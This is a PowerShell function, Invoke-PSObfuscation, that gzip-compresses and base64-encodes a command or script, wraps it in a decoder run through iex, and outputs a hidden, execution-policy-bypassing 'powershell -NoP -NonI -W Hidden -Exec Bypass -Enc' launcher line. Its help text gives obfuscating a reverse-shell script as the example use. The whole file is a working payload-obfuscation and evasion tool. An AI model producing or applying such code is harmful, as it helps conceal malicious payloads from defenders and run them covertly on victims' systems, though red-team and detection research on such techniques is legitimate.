Function Invoke-PSObfuscation
{
<#
	.SYNOPSIS
		Converts a string or contents of a file to an obfuscated command.

	.DESCRIPTION
		This function will take in either a string, which could be a simple command syntax or the contents of a script 
	    file. Once the input has been selected, it'll go through a series of conversions from your raw payload, to a
	    byte array, a compressed gzipstream, an encoded gzipstream, then finally encoding the decoder function.

	.PARAMETER  String
		A simple string containing a simple one line command.

	.PARAMETER  Path
		The location of a script file with the desired content to obfuscate.
	
	.EXAMPLE
		PS C:\> Invoke-PSObfuscation -Path C:\revshell.ps1     
	    powershell -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand '...EncodedOutput....'
	
	.EXAMPLE
        PS C:\> Invoke-PSObfuscation -String '([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")'
	    powershell -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand '...EncodedOutput....'
	
	.INPUTS
		System.String

	.OUTPUTS
		System.String

	.NOTES
		Last Edit: 09/03/2019 @ 1400

	.LINK
		https://github.com/gh0x0st
#>
	[CmdletBinding()]
	param (
		[Parameter(Position = 0, Mandatory = $false,ParameterSetName = 'String')]
		[System.String]$String,
		[Parameter(Position = 1, Mandatory = $false,ParameterSetName = 'File Content')]
		[ValidateScript({ Test-Path $_ })]
		[System.String]$Path
	)
	Begin
	{
		Try
		{
			Write-Verbose "[*] - Obfuscating $($PsCmdlet.ParameterSetName)"
		}
		Catch
		{
			Write-Output "[!]$(Get-Date -Format '[MM-dd-yyyy][HH:mm:ss]') - ScriptLine: $($_.InvocationInfo.ScriptLineNumber) | ExceptionType: $($_.Exception.GetType().FullName) | ExceptionMessage: $($_.Exception.Message)"
			Break
		}
	}
	Process
	{
		Try
		{
			#ByteArray
			Write-Verbose "[*] - Converting to byte array"
			switch ($PsCmdlet.ParameterSetName)
			{
				"String" { [System.String]$Content = $String }
				"File Content" { [System.String[]]$Content = [System.IO.File]::ReadAllLines((Resolve-Path $Path)) }
			}
			[System.Text.Encoding]$Encoding = [System.Text.Encoding]::ASCII
			[byte[]]$ByteArray = $Encoding.GetBytes($Content)
			
			#GzipStream
			Write-Verbose "[*] - Converting to Gzip stream"
			[System.IO.Stream]$MemoryStream = New-Object System.IO.MemoryStream
			[System.IO.Stream]$GzipStream = New-Object System.IO.Compression.GzipStream $MemoryStream, ([System.IO.Compression.CompressionMode]::Compress)
			$GzipStream.Write($ByteArray, 0, $ByteArray.Length)
			$GzipStream.Close()
			$MemoryStream.Close()
			[byte[]]$GzipStream = $MemoryStream.ToArray()
			
			#Stream Encoder
			Write-Verbose "[*] - Encoding gzip stream"
			[System.String]$EncodedGzipStream = [System.Convert]::ToBase64String($GzipStream)
			
			#Decoder Encoder
			Write-Verbose "[*] - Encoding decoder function"
			[System.String]$Decoder = '$Decoded = [System.Convert]::FromBase64String("<Base64>");$ms = (New-Object System.IO.MemoryStream($Decoded,0,$Decoded.Length));iex(New-Object System.IO.StreamReader(New-Object System.IO.Compression.GZipStream($ms, [System.IO.Compression.CompressionMode]::Decompress))).readtoend()'
			[System.String]$Decoder = $Decoder -replace "<Base64>", "$EncodedGzipStream"
			[byte[]]$bytes = [System.Text.Encoding]::Unicode.GetBytes($Decoder)
			[System.String]$EncodedCommand = [Convert]::ToBase64String($bytes)
		}
		Catch
		{
			Write-Output "[!]$(Get-Date -Format '[MM-dd-yyyy][HH:mm:ss]') - ScriptLine: $($_.InvocationInfo.ScriptLineNumber) | ExceptionType: $($_.Exception.GetType().FullName) | ExceptionMessage: $($_.Exception.Message)"
			Break
		}
	}
	End
	{
		Try
		{
			Write-Verbose '[*] - Outputing final command'
			return 'powershell -NoP -NonI -W Hidden -Exec Bypass -Enc ' + "'" + $EncodedCommand + "'"
		}
		Catch
		{
			Write-Output "[!]$(Get-Date -Format '[MM-dd-yyyy][HH:mm:ss]') - ScriptLine: $($_.InvocationInfo.ScriptLineNumber) | ExceptionType: $($_.Exception.GetType().FullName) | ExceptionMessage: $($_.Exception.Message)"
			Break
		}
	}
}
